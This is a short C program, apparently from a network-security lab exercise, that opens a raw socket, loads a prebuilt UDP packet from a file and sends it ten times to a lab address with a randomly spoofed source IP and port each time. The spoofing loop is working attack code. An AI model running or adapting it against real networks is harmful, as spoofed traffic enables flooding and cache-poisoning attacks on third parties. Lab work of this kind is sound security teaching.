#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_FILE_SIZE 2000
#define TARGET_IP "10.9.0.5"

int send_packet_raw(int sock, char *ip, int n);

int main()
{
  // create raw socket
  int enable = 1;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
  
  // read the UDP packet from file
  FILE *f = fopen("ip.bin", "rb");
  if(!f) {
    perror("Can't open 'ip.bin'");
    exit(0);
  }
  unsigned char ip[MAX_FILE_SIZE];
  int n = fread(ip, 1, MAX_FILE_SIZE, f);
  
  // modify and send out UDP packets
  srand(time(0)); // initialize the seed for random # generation.
  
  for(int i = 0; i < 10; i++) {
    unsigned short src_port;
    unsigned int src_ip;
    
    src_ip = htonl(rand());
    memcpy(ip + 12, &src_ip, 4); // modify source IP
    
    src_port = htons(rand());
    memcpy(ip + 20, &src_port, 2); // modify source port
    
    send_packet_raw(sock, ip, n); // send packet  
    
    //sleep(1); 
  }
  close(sock);
}

int send_packet_raw(int sock, char *ip, int n)
{
  struct sockaddr_in dest_info;
  	
  // Destination info
  // 목적지 정보를 설정
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);
	
  // Send the packet out
  // 원시 IP 패킷을 전송
  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
  if(r < 0)
  {
    perror("Failed to send packet. Did you run it using sudo?\n");
  }
  else
  {
    printf("Sent a packet of size: %d\n", r);
  }
  
  return r;
}


